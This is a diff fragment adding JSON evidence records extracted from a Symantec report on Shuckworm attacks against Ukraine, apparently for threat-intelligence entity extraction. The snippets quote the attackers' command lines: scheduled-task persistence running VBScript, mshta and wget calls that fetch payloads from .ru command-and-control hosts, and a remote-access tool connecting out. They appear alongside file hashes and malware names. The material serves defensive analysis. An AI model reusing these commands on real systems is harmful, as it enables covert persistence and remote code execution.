+      "text": "SCHTASKS /CREATE /sc minute /mo 10 /tn \"deep-thoughted\" /tr \"wscript.exe \" CSIDL_COMMON_PICTURES\\deep-thoughted.ppt //e:VBScript //b\" /F",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_50",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r3"
+      },
+      "text": "Later, the attackers are observed executing an HTA file hosted on a remote server by abusing mshta.exe via depended.exe. The Mshta utility can execute Microsoft HTML Application (HTA) files and can be abused to bypass application control solutions. Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_51",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r4"
+      },
+      "text": "\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://fiordan.ru/FILM.html /f id=[REDACTED]",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_52",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r5"
+      },
+      "text": "At the same time, a new variant of Pterodo is installed via depended.exe.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_53",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r6"
+      },
+      "text": "\"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b \" /F\" \"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\" /tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\webmedia.m3u //e:VBScript //b \" /F\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_54",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r7"
+      },
+      "text": "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\22333.docx //e:VBScript //b \"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\9140.d //e:VBScript //b wscript.exe CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b schtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr \"wscript.exe C:\\Users\\o.korol\\AppData\\Roaming\\battery\\battery.dat //e:VBScript //b\" \"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_PROFILE\\appdata\\roaming\\battery\\battery.cmd",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_55",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r8"
+      },
+      "text": "Directly after this, it appears the attackers test connectivity to a new C&C server via ping.exe:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_56",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r9"
+      },
+      "text": "CSIDL_SYSTEM\\cmd.exe /c ping -n 1 arianat.ru",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_57",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r1"
+      },
+      "text": "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\12382. //e:VBScript //b \"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7- ZIP.html /f id=<?,?> CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7-ZIP.html /f id=<?,?> \"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"MediaConverter\" /tr \"wscript.exe \" CSIDL_COMMON_MUSIC\\mediatv.mov //e:VBScript //b \" /F\" \"CSIDL_SYSTEM\\schtasks.exe\" /CREATE /sc minute /mo 12 /tn \"VideoHostName\" /tr \"wscript.exe \" CSIDL_COMMON_VIDEO\\videotv.m3u //e:VBScript //b \" /F\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_58",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r2"
+      },
+      "text": "At 05:28, the attackers return, and several additional variants of Pterodo are executed via CSIDL_COMMON_VIDEO\\planeta.exe (1ea3881d5d03214d6b7e37fb7b10221ef51782080a24cc3e275f42a3c1ea99c1).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_60",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r4"
+      },
+      "text": "The attackers are then observed executing commands via planeta.exe:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_62",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r6"
+      },
+      "text": "Later, another variant ofPterodo (deep-sided.fly) was executed and was used to download and execute a new file called deerskin.exe (ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29). This file is a",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_64",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r2"
+      },
+      "text": "\"%USERPROFILE%\\Contacts\\DriversHood.exe\" -autoreconnect -id:2097 -connect mucoris.ru:5612",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_66",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r4"
+      },
+      "text": "descend.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_67",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r5"
+      },
+      "text": "Upon execution, the file named descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) drops a VBS file which, in turn, drops a second VBS file in the following locations:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_69",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r1"
+      },
+      "text": "The file deerbrook.ppt (b46e872375b3c910fb589ab75bf130f7e276c4bcd913705a140ac76d9d373c9e) VBS file contacts a command-and-control (C&C) server at deep-pitched.enarto.ru. If the C&C server is available, a HTTP POST request is sent to download a payload, which is saved in the %USERPROFILE% folder as deep-sunken.tmp then renamed to deep-sunken.exe and executed. The binary is then deleted.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_70",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r2"
+      },
+      "text": "deep-sunken.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_71",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r3"
+      },
+      "text": "Upon execution, the file deep-sunken.exe (02c41bddd087522ce60f9376e499dcee6259853dcb50ddad70cb3ef8dd77c200) drops the following files on the compromised computer:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_72",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r4"
+      },
+      "text": "%APPDATA%\\baby\\baby.cmd %APPDATA%\\baby\\baby.dat %APPDATA%\\baby\\basement.exe (wget binary) %APPDATA%\\baby\\vb_baby.vbs",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_73",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r5"
+      },
+      "text": "schtasks /Create /SC MINUTE /MO 15 /F /tn BackgroundConfigSurveyor /tr \"wscript.exe [%APPDATA%]\\baby\\baby.dat\" //e:VBScript //b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_74",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r6"
+      },
+      "text": "basement.exe --user-agent=\"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.64:: [VICTIM_ID]::/.beagle/.\" -q -b -c -t 2 \"hxxp://arianat.ru/baby.php\" -P \" [%APPDATA%]\\baby\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_75",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r7"
+      },
+      "text": "The baby.dat file is a VBS file that executes baby.cmd, which then downloads and executes the payload from the C&C server.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_76",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r8"
+      },
+      "text": "The vb_baby.vbs file renames the downloaded payload from baby.php to backed.exe.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_77",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r9"
+      },
+      "text": "The downloaded payload (backed.exe) could not be retrieved. However, the following files were also obtained during our investigation:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_78",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r10"
+      },
+      "text": "z4z05jn4.egf.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_79",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r11"
+      },
+      "text": "The file z4z05jn4.egf.exe (fd9a9dd9c73088d1ffdea85540ee671d8abb6b5ab37d66a760b2350951c784d0) is similar to the previous file (deep-sunken.exe) but with different folders, file names, and C&C server (iruto.ru).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_80",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r12"
+      },
+      "text": "defiant.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_81",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r1"
+      },
+      "text": "Once executed, the file defiant.exe (a20e38bacc979a5aa18f1954df1a2c0558ba23cdc1503af0ad1021c330f1e455) drops a VBS file in the following locations:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_82",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r2"
+      },
+      "text": "SCHTASKS /CREATE /sc minute /mo 12 /tn \\\"deep-versed\\\" /tr \\\"wscript.exe \\\" [%PUBLIC%]\\\\Pictures\\\\deep-versed.nls\\\" //e:VBScript //b\\\" /F",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_83",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r3"
+      },
+      "text": "The dropped file deep-versed.nls (817901df616c77dd1e5694e3d75aebb3a52464c23a06820517108c74edd07fbc) downloads a payload from a C&C server (deep-toned.chehalo.ru) and saves it as deep-green.exe in the following location:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_90",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r10"
+      },
+      "text": "A third file called deep-green.exe (de5a53a3b75e3e730755af09e3cacb7e6d171fc9b1853a7200e5dfb9044ab20a) is similar to descend.exe (0d4b8e244f19a009cee50252f81da4a2f481da9ddb9b204ef61448d56340c137) just with different file names and C&C server (deer-lick.chehalo.ru).",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_91",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 6,
+        "section": "rule",
+        "sentence_id": "p6_r11"
+      },
+      "text": "deep-green.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_92",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r1"
+      },
+      "text": "The fourth and final file named deep-green.exe (d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7) drops a VBS file in the following location:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_93",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r2"
+      },
+      "text": "\"/CREATE /sc minute /mo 12 /tn \\\"MediaConverter\\\" /tr \\\"wscript.exe \\\"C:\\\\Users\\\\Public\\\\Music\\\\MediaConvertor.dat\\\" //e:VBScript //b \\\" /F\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_94",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r3"
+      },
+      "text": "The MediaConvertor.dat file searches for removable drives and creates a .lnk file with the following command:",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_95",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 7,
+        "section": "rule",
+        "sentence_id": "p7_r4"
+      },
+      "text": "mshta.exe hxxp://PLAZMA.VIBER.ontroma.ru/PLAZMA.html /f id=January",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_97",
+      "evidence_type": "report_text",
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "locator": {
+        "page": 8,
+        "section": "rule",
+        "sentence_id": "p8_r1"
+      },
+      "text": "deceive.exe deceived.exe deception.exe deceptive.exe decide.exe decided.exe decipher.exe decisive.exe deep-sunken.exe deep-vaulted.exe Detected command lines are simple and consist of just the binary path + name; no switches, etc. Many suspected malicious files have unknown parent process hashes, none of which have available information.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    }
+  ],
+  "structured_relation_blocks": [
+    {
+      "evidence_id": "ev_62",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_file_deerskin.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_6",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_malware_Pterodo",
+        "ent_malware_backdoor_leveraged_by_Shuckworm"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_83",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_file_deep-green.exe",
+        "ent_file_deep-versed.nls"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_3",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_malware_Pteranodon",
+        "ent_malware_Pterodo"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_29",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_baby.cmd",
+        "ent_file_baby.dat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_34",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_file_deep-green.exe",
+        "ent_file_descend.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_75",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_baby.cmd",
+        "ent_file_baby.dat"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_79",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_deep-sunken.exe",
+        "ent_file_z4z05jn4.egf.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_90",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_file_deep-green.exe",
+        "ent_file_descend.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_1",
+      "page": 1,
+      "candidate_entity_ids": [],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_39",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_file_deceive.exe",
+        "ent_file_deception.exe",
+        "ent_file_deceptive.exe",
+        "ent_file_decide.exe",
+        "ent_file_decipher.exe",
+        "ent_file_decisive.exe",
+        "ent_file_deep-sunken.exe",
+        "ent_file_deep-vaulted.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_97",
+      "page": 8,
+      "candidate_entity_ids": [
+        "ent_file_deceive.exe",
+        "ent_file_deception.exe",
+        "ent_file_deceptive.exe",
+        "ent_file_decide.exe",
+        "ent_file_decipher.exe",
+        "ent_file_decisive.exe",
+        "ent_file_deep-sunken.exe",
+        "ent_file_deep-vaulted.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_57",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_file_cmd.exe",
+        "ent_file_mshta.exe",
+        "ent_file_schtasks.exe",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_54",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_file_battery.dat",
+        "ent_file_cmd.exe",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_72",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_baby.cmd",
+        "ent_file_baby.dat",
+        "ent_file_basement.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_58",
+      "page": 3,
+      "candidate_entity_ids": [
+        "ent_malware_Pterodo",
+        "ent_file_planeta.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_32",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_defiant.exe",
+        "ent_file_z4z05jn4.egf.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_47",
+      "page": 1,
+      "candidate_entity_ids": [
+        "ent_file_reflect.rar",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_51",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_file_cmd.exe",
+        "ent_file_mshta.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_53",
+      "page": 2,
+      "candidate_entity_ids": [
+        "ent_file_schtasks.exe",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_73",
+      "page": 5,
+      "candidate_entity_ids": [
+        "ent_file_baby.dat",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_82",
+      "page": 6,
+      "candidate_entity_ids": [
+        "ent_file_deep-versed.nls",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    },
+    {
+      "evidence_id": "ev_93",
+      "page": 7,
+      "candidate_entity_ids": [
+        "ent_file_MediaConvertor.dat",
+        "ent_file_wscript.exe"
+      ],
+      "rule_relation_count": 0,
+      "llm_relation_count": 0
+    }
+  ]
+}
